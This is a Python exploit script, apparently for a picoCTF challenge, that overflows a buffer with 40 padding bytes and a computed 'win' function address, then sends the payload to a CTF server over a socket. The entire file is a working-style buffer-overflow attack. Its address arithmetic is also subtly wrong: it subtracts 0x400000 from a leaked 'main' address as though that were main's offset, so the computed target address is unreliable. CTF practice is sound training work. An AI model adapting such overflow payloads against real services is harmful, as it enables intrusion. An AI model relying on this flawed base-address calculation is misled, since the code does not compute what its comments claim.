import socket

# Replace this with the address of 'main' that you leak from the program
leaked_main_address = 0x5de9f9bdf33d

# Offset of the 'win' function from the base address of the binary
win_function_offset = 0x12a7  # From your earlier analysis of the binary

# Calculate the base address of the binary
base_address = leaked_main_address - (0x400000)  # Subtract the known address of main (0x400000 in this case)

# Calculate the address of the win function
win_address = base_address + win_function_offset

# Padding to overflow the buffer and reach the function pointer
padding = b"A" * 40  # Adjust this if needed based on buffer size

# The address of the win function (little-endian format)
payload = padding + win_address.to_bytes(8, byteorder='little')

# Connect to the vulnerable server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("rescued-float.picoctf.net", 55705))

# Send the payload
s.send(payload)

# Receive and print the response
response = s.recv(1024)
print(response.decode())

# Close the connection
s.close()
